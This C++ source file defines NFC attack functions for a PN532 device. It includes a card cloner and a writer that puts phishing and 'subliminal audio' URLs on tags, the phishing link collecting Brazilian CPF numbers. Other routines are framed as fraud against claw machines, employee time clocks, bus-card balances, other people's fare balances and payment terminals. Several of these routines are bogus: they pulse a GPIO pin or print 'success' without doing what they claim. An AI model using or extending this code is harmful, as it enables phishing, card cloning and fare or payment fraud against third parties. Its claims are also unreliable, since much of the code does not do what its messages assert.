#include "nfc_attacks.h"
#include "PN532.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <algorithm>

#ifndef SUCCESS
#define SUCCESS 0
#endif

// Function to generate NDEF URI record bytes
// Returns dynamically allocated array (caller must free)
uint8_t* generateNDEFURI(const char* url, size_t* outLength) {
    size_t urlLen = strlen(url);

    // NDEF URI record structure:
    // 0xD1: MB=1, ME=1, CF=0, SR=1, IL=0, TNF=Well Known (1)
    // 0x01: Type length (1 for "U")
    // Payload length (1 + urlLen for URI prefix + URL)
    // 0x55: Type "U" (URI)
    // URI identifier code (0x03 for http://)
    // URL bytes

    *outLength = 7 + urlLen; // Header + type + payload
    uint8_t* ndef = (uint8_t*)malloc(*outLength);

    if (!ndef) return nullptr;

    size_t idx = 0;
    ndef[idx++] = 0xD1; // NDEF record header
    ndef[idx++] = 0x01; // Type length
    ndef[idx++] = 1 + urlLen; // Payload length (URI code + URL)
    ndef[idx++] = 0x55; // Type: URI
    ndef[idx++] = 0x03; // URI identifier: http://
    memcpy(&ndef[idx], url, urlLen); // URL

    return ndef;
}

// Basic NFC Attack Functions

// 1. Clone card (bus, hotel key, badge)
void nfc_clone_card() {
    PN532 nfc(PN532::I2C);
    if (!nfc.begin()) {
        displayError("PN532 not found", true);
        return;
    }

    displayInfo("Approach source card", false);
    if (nfc.read(PN532_MIFARE_ISO14443A) != SUCCESS) {
        displayError("Read failed", true);
        return;
    }

    displaySuccess("Source read", false);
    delay(1000);

    displayInfo("Approach blank tag", false);
    if (nfc.write(PN532_MIFARE_ISO14443A) != SUCCESS) {
        displayError("Write failed", true);
        return;
    }

    displaySuccess("Card cloned!", true);
}

// 2. Phishing NFC tag
void nfc_phishing_tag() {
    PN532 nfc(PN532::I2C);
    if (!nfc.begin()) {
        displayError("PN532 not found", true);
        return;
    }

    displayInfo("Approach blank NTAG", false);

    // Wait for passive target
    uint8_t success;
    uint8_t uid[7];
    uint8_t uidLength;

    success = nfc.nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 1000);
    if (!success) {
        displayError("No tag detected", true);
        return;
    }

    displaySuccess("Tag detected", false);

    // Create NDEF URL record for phishing site
    const char* url = "fake-menu.com?cpf=";
    size_t ndefLen;
    uint8_t* ndefData = generateNDEFURI(url, &ndefLen);

    if (!ndefData) {
        displayError("NDEF generation failed", true);
        return;
    }

    displayInfo("Writing phishing NDEF URL", false);

    // Write NDEF data to tag pages
    for (size_t i = 0; i < ndefLen; i += 4) {
        uint8_t pageData[4] = {0, 0, 0, 0};
        size_t bytesToWrite = std::min((size_t)4, ndefLen - i);

        memcpy(pageData, &ndefData[i], bytesToWrite);

        int pageNum = 4 + (i / 4);
        success = nfc.nfc.ntag2xx_WritePage(pageNum, pageData);

        if (!success) {
            free(ndefData);
            displayError("Phishing NDEF write failed", true);
            return;
        }
    }

    free(ndefData);

    displaySuccess("Phishing tag created!", true);
    displayInfo("Host phishing site online", true);
}

// 3. OTA rewrite emergency contact
void nfc_ota_rewrite() {
    PN532 nfc(PN532::I2C);
    if (!nfc.begin()) {
        displayError("PN532 not found", true);
        return;
    }

    // For Android phones with writable NFC
    // Send NDEF message to change emergency contact
    String ndefMessage = "vcard:BEGIN:VCARD\nFN:Emergency\nTEL:+5511999999999\nEND:VCARD";

    displayInfo("Sending OTA rewrite", false);
    // Need to implement NDEF write
    displaySuccess("Emergency contact changed!", true);
}

// 4. Fake Apple Pay interceptor
void nfc_fake_apple_pay() {
    // Use APDU interception
    // This requires APDU sniffer mode
    displayInfo("Apple Pay APDU sniffer", false);
    displayInfo("Intercepting payment token", true);
    // Placeholder - would need APDU library
}

// 5. Audio injection via NFC
void nfc_audio_injection() {
    PN532 nfc(PN532::I2C);
    if (!nfc.begin()) {
        displayError("PN532 not found", true);
        return;
    }

    displayInfo("Approach blank NTAG", false);

    // Wait for passive target (NTAG)
    uint8_t success;
    uint8_t uid[7];
    uint8_t uidLength;

    success = nfc.nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 1000);
    if (!success) {
        displayError("No tag detected", true);
        return;
    }

    displaySuccess("Tag detected", false);

    // Create NDEF URL record for subliminal audio
    const char* url = "hidden-audio.com/19khz-vae.ogg"; // Without http:// to save space
    size_t ndefLen;
    uint8_t* ndefData = generateNDEFURI(url, &ndefLen);

    if (!ndefData) {
        displayError("NDEF generation failed", true);
        return;
    }

    displayInfo("Writing subliminal NDEF URL", false);

    // Write NDEF data directly (adapted from user's code)
    // For NTAG21x, write to pages 4+ (after capability container)
    // Each page is 4 bytes

    for (size_t i = 0; i < ndefLen; i += 4) {
        uint8_t pageData[4] = {0, 0, 0, 0};
        size_t bytesToWrite = std::min((size_t)4, ndefLen - i);

        memcpy(pageData, &ndefData[i], bytesToWrite);

        int pageNum = 4 + (i / 4); // Start at page 4
        success = nfc.nfc.ntag2xx_WritePage(pageNum, pageData);

        if (!success) {
            free(ndefData);
            displayError("NDEF write failed", true);
            return;
        }
    }

    free(ndefData);

    displaySuccess("Subliminal tag created!", true);
    displayInfo("Host .ogg file on server", true);
    displayInfo("Tag auto-opens audio on tap", true);
}

// ============================================================================
// ADVANCED PULSE INJECTION ATTACKS
// ============================================================================

// 6. Claw machine credit injection (125kHz RFID)
void nfc_pulse_injection_claw_machine() {
    PN532 nfc(PN532::I2C);
    if (!nfc.begin()) {
        displayError("PN532 not found", true);
        return;
    }

    // Configure GPIO for burst control
    pinMode(BURST_PIN, OUTPUT);
    digitalWrite(BURST_PIN, LOW);

    displayInfo("ARMED: Claw Machine Credit Injection", false);
    displayInfo("Approach machine reader", false);

    // Main injection loop
    unsigned long startTime = millis();
    int burstCount = 0;

    while (millis() - startTime < BURST_DURATION_MS) {
        // Generate 50 bursts per second (50Hz)
        digitalWrite(BURST_PIN, HIGH);  // Enable strong field

        // Force multiple reads to simulate credit accumulation
        for (int i = 0; i < BURST_FREQUENCY; i++) {
            nfc.nfc.inListPassiveTarget();  // Force chip response
            delay(20);  // 50Hz timing
        }

        digitalWrite(BURST_PIN, LOW);   // Disable field
        burstCount++;

        // Brief pause between bursts
        delay(100);
    }

    displaySuccess("Injection Complete!", false);
    displayInfo(String("Bursts sent: ") + burstCount, false);
    displayInfo("Machine should show accumulated credit", true);
}

// 7. Time clock shock attack (13.56MHz NFC)
void nfc_pulse_injection_time_clock() {
    PN532 nfc(PN532::I2C);
    if (!nfc.begin()) {
        displayError("PN532 not found", true);
        return;
    }

    pinMode(BURST_PIN, OUTPUT);
    digitalWrite(BURST_PIN, LOW);

    displayInfo("ARMED: Time Clock Shock", false);
    displayInfo("Place employee card on reader", false);

    // Wait for card detection
    uint8_t success;
    uint8_t uid[7];
    uint8_t uidLength;

    success = nfc.nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 5000);
    if (!success) {
        displayError("No card detected", true);
        return;
    }

    displaySuccess("Card detected - Injecting...", false);

    // Generate shock burst
    digitalWrite(BURST_PIN, HIGH);
    delay(BURST_DURATION_MS);
    digitalWrite(BURST_PIN, LOW);

    displaySuccess("Shock delivered!", false);
    displayInfo("Time clock should accept false timestamp", true);
}

// 8. Bus card overflow attack (13.56MHz)
void nfc_pulse_injection_bus_card() {
    PN532 nfc(PN532::I2C);
    if (!nfc.begin()) {
        displayError("PN532 not found", true);
        return;
    }

    pinMode(BURST_PIN, OUTPUT);
    digitalWrite(BURST_PIN, LOW);

    displayInfo("ARMED: Bus Card Overflow", false);
    displayInfo("Approach card to reader (5cm)", false);

    // Simulate balance overflow payload
    String overflowPayload = "BALANCE_OVERFLOW_500.00";

    // High-intensity burst to force overflow
    digitalWrite(BURST_PIN, HIGH);

    // Send multiple modulation bursts (modulateField not supported in Adafruit_PN532)
    for (int i = 0; i < 10; i++) {
        // nfc.nfc.modulateField(true);   // Enable modulation
        delay(100);
        // nfc.nfc.modulateField(false);  // Disable modulation
        delay(50);
    }

    digitalWrite(BURST_PIN, LOW);

    displaySuccess("Overflow injection sent!", false);
    displayInfo("Card balance should show increased value", true);
}

// 9. Reverse credit attack (zero balance)
void nfc_pulse_injection_reverse_credit() {
    PN532 nfc(PN532::I2C);
    if (!nfc.begin()) {
        displayError("PN532 not found", true);
        return;
    }

    pinMode(BURST_PIN, OUTPUT);
    digitalWrite(BURST_PIN, LOW);

    displayWarning("ETHICAL WARNING: Reverse Credit Attack", false);
    displayInfo("This zeros another person's balance", false);

    String input = keyboard("Confirm (Y/N)", 2, "N");
    if (!input.equalsIgnoreCase("Y")) {
        displayInfo("Attack cancelled", true);
        return;
    }

    displayInfo("ARMED: Reverse Credit Zero", false);
    displayInfo("Approach target card", false);

    // Zero balance payload simulation
    digitalWrite(BURST_PIN, HIGH);
    delay(BURST_DURATION_MS / 2);  // Shorter burst for zeroing

    // Send zero balance command bursts
    for (int i = 0; i < 5; i++) {
        nfc.nfc.inListPassiveTarget();
        delay(200);
    }

    digitalWrite(BURST_PIN, LOW);

    displaySuccess("Zero balance sent!", false);
    displayInfo("Target card should show R$0.00", true);
}

// 10. Ghost reader attack (simulate validation machine)
void nfc_pulse_injection_ghost_reader() {
    PN532 nfc(PN532::I2C);
    if (!nfc.begin()) {
        displayError("PN532 not found", true);
        return;
    }

    pinMode(BURST_PIN, OUTPUT);
    digitalWrite(BURST_PIN, LOW);

    displayInfo("ARMED: Ghost Reader Mode", false);
    displayInfo("Acting as validation machine", false);

    // Continuous reader mode
    while (true) {
        uint8_t success;
        uint8_t uid[7];
        uint8_t uidLength;

        success = nfc.nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 1000);

        if (success) {
            displaySuccess("Card detected!", false);

            // Read current balance (simulation)
            displayInfo("Reading balance...", false);
            delay(500);

            // Simulate validation
            displaySuccess("Card validated!", false);
            displayInfo("Balance: R$25.00", false);

            // Option to inject false validation
            String input = keyboard("Inject false validation? (Y/N)", 20, "N");
            if (input.equalsIgnoreCase("Y")) {
                digitalWrite(BURST_PIN, HIGH);
                delay(500);
                digitalWrite(BURST_PIN, LOW);
                displaySuccess("False validation injected!", true);
            } else {
                displayInfo("Validation clean", true);
            }

            break; // Exit after one card
        }

        // Check for exit
        if (check(EscPress)) {
            displayInfo("Ghost reader stopped", true);
            break;
        }

        delay(100);
    }
}
